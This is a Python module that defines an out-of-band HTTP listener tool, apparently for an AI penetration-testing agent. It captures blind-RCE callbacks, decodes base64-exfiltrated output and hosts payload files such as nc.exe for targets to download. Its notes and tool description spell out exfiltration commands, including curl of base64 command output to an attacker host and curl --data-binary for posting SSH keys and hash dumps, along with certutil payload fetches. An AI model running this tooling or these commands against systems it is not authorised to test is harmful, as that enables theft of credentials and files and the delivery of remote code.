import base64
import http.server
import os
import tempfile
import threading
from typing import Optional

from core.utils import get_interface_ip as _get_interface_ip

# Module-level listener state — one listener per process
_server:           Optional[http.server.HTTPServer] = None
_server_thread:    Optional[threading.Thread]        = None
_received:         list = []
_listener_port:    int  = 0
_listener_ip:      str  = ""
_serve_dir:        str  = ""     # directory of payloads to serve, if any


# Cap a single captured body so a runaway upload can't exhaust memory. A key/dump
# is well under this; the agent gets the whole thing.
_MAX_BODY = 8 * 1024 * 1024


def _try_b64_text(seg: str) -> str:
    """Decode `seg` if it is base64 (how blind RCE exfiltrates output:
    curl http://attacker/$(cmd|base64), or a base64 POST body). Empty if not."""
    seg = (seg or "").strip()
    if len(seg) < 4:
        return ""
    for fn in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            pad = seg + "=" * (-len(seg) % 4)
            out = fn(pad).decode("utf-8", errors="replace")
            # Heuristic: mostly printable → treat as decoded exfil
            if out and sum(c.isprintable() or c in "\r\n\t" for c in out) / len(out) > 0.8:
                return out
        except Exception:
            continue
    return ""


def _try_b64_decode(path: str) -> str:
    """Decode a base64 last-path-segment (URL-path exfil)."""
    return _try_b64_text(path.strip("/").split("/")[-1].split("?")[0])


class _CallbackHandler(http.server.BaseHTTPRequestHandler):
    def _maybe_serve(self) -> bool:
        if not _serve_dir:
            return False
        name = os.path.basename(self.path.split("?")[0].strip("/"))
        fpath = os.path.join(_serve_dir, name)
        if name and os.path.isfile(fpath):
            try:
                with open(fpath, "rb") as f:
                    body = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                _received.append({"method": self.command, "path": self.path,
                                  "remote_addr": self.client_address[0], "served": name})
                return True
            except Exception:
                return False
        return False

    def _read_body(self) -> bytes:
        """Read the request body (length-safe). This is how a large/whole-file exfil
        works — the target POSTs/PUTs the file in the body instead of cramming it into
        a length-limited URL: curl --data-binary @key http://attacker:port/."""
        try:
            clen = int(self.headers.get("Content-Length", 0) or 0)
        except (TypeError, ValueError):
            return b""
        if clen <= 0:
            return b""
        try:
            return self.rfile.read(min(clen, _MAX_BODY))
        except Exception:
            return b""

    def _record(self):
        if self._maybe_serve():
            return
        body = self._read_body()
        entry = {
            "method":      self.command,
            "path":        self.path,
            "remote_addr": self.client_address[0],
            "headers":     dict(self.headers),
            "decoded":     _try_b64_decode(self.path),
        }
        if body:
            text = body.decode("utf-8", errors="replace")
            entry["body"] = text
            # If the body itself is base64 (e.g. `base64 key | curl --data-binary @-`),
            # surface the decoded form too.
            dec = _try_b64_text(text)
            if dec and dec != text:
                entry["body_decoded"] = dec
        _received.append(entry)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):  self._record()
    def do_POST(self): self._record()
    def do_PUT(self):  self._record()
    def do_HEAD(self): self._record()

    def log_message(self, *args):
        pass  # suppress access log noise


def _ensure_server(port: int, interface: str) -> Optional[dict]:
    """Start the listener if not already running. Returns an error dict or None."""
    global _server, _server_thread, _listener_ip, _listener_port
    if _server:
        return None
    ip = _get_interface_ip(interface)
    if not ip:
        return {"error": f"Could not get an IP for interface '{interface}' (try eth0/tun0/wlan0)."}
    try:
        _server = http.server.HTTPServer(("0.0.0.0", port), _CallbackHandler)
    except OSError as e:
        return {"error": f"Could not bind to port {port}: {e}"}
    _listener_ip = ip
    _listener_port = port
    _server_thread = threading.Thread(target=_server.serve_forever, daemon=True)
    _server_thread.start()
    return None


def oob_listener(
    action: str = "start",
    interface: str = "tun0",
    port: int = 8888,
    filename: str = "",
    content: str = "",
) -> dict:
    global _server, _serve_dir, _received

    if action == "start":
        _received = []
        err = _ensure_server(port, interface)
        if err:
            return err
        return {
            "status":       "listening",
            "interface":    interface,
            "ip":           _listener_ip,
            "port":         _listener_port,
            "callback_url": f"http://{_listener_ip}:{_listener_port}/",
            "note": ("Use callback_url in SSRF/XXE/blind-injection payloads. For SHORT blind-RCE "
                     "output, have the target run e.g. curl http://"
                     f"{_listener_ip}:{_listener_port}/$(id|base64 -w0) — the base64 path is "
                     "auto-decoded into 'decoded'/'exfil' on action='check'. For a LARGE or whole-file "
                     "exfil (an SSH key, a hash dump, any output that keeps getting cut short in the "
                     "URL or your command channel), POST/PUT it in the request BODY instead — e.g. "
                     f"curl --data-binary @/path/to/file http://{_listener_ip}:{_listener_port}/ — "
                     "the full body comes back under 'bodies' on action='check' (never use the "
                     "length-limited URL for a key/file)."),
        }

    elif action == "check":
        hits = list(_received)
        # 'exfil' = short URL-path output; 'bodies' = whole posted/put payloads (a key,
        # a dump, any file too big for a URL). Decoded body preferred over raw.
        bodies = [h.get("body_decoded") or h.get("body") for h in hits if h.get("body")]
        return {
            "callback_fired": len(hits) > 0,
            "count":          len(hits),
            "received":       hits,
            "exfil":          [h.get("decoded") for h in hits if h.get("decoded")],
            "bodies":         bodies,
            "callback_url":   f"http://{_listener_ip}:{_listener_port}/" if _listener_ip else "",
        }

    elif action == "host":
        # Serve a payload file for the target to download (e.g. nc.exe, a script).
        if not filename or content == "":
            return {"error": "host action needs filename and content"}
        err = _ensure_server(port, interface)
        if err:
            return err
        if not _serve_dir:
            _serve_dir = tempfile.mkdtemp(prefix="pentest_payloads_")
        safe = os.path.basename(filename)
        with open(os.path.join(_serve_dir, safe), "w", encoding="utf-8") as f:
            f.write(content)
        url = f"http://{_listener_ip}:{_listener_port}/{safe}"
        return {"status": "hosted", "url": url, "filename": safe,
                "note": f"Target can fetch it: curl -o /tmp/{safe} {url}  (or certutil -urlcache -f {url} {safe} on Windows)"}

    elif action == "stop":
        total = len(_received)
        if _server:
            try:
                _server.shutdown()
            except Exception:
                pass
            _server = None
        _serve_dir = ""
        return {"status": "stopped", "total_received": total}

    return {"error": f"Unknown action '{action}'. Use: start, check, host, stop"}


TOOL_DEFINITION = {
    "name": "oob_listener",
    "description": (
        "Out-of-band HTTP listener — for blind vulnerability detection AND blind-RCE output "
        "exfiltration. Start it for a callback URL to use in SSRF/XXE/blind-injection payloads. For "
        "SHORT blind command output, have the target run `curl http://ATTACKER:PORT/$(cmd|base64 -w0)`; "
        "action='check' returns each callback with the base64 path auto-decoded in 'decoded'/'exfil'. "
        "For a LARGE or whole-file exfil (an SSH key, a password/hash dump, anything that keeps getting "
        "cut short in a URL or a lossy command-readback channel), have the target POST/PUT the data in "
        "the request BODY — `curl --data-binary @/path/file http://ATTACKER:PORT/` — and action='check' "
        "returns the complete payload under 'bodies' (the URL path is length-limited; the body is not). "
        "action='host' serves a payload file (filename+content) so the target can download it. Reads "
        "the attacker IP from the local interface (tun0 for VPN, eth0 for direct). Actions: start, "
        "check, host, stop."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": ["start", "check", "host", "stop"],
                "description": "start=begin listening and get URL, check=see received callbacks, stop=shut down",
            },
            "interface": {
                "type": "string",
                "description": "Network interface to get IP from (default: tun0 for VPN, use eth0 for direct connection)",
            },
            "port": {
                "type": "integer",
                "description": "Port to listen on (default: 8888). Must be reachable from the target.",
            },
            "filename": {
                "type": "string",
                "description": "For action='host': the filename to serve.",
            },
            "content": {
                "type": "string",
                "description": "For action='host': the file content to serve.",
            },
        },
        "required": ["action"],
    },
}
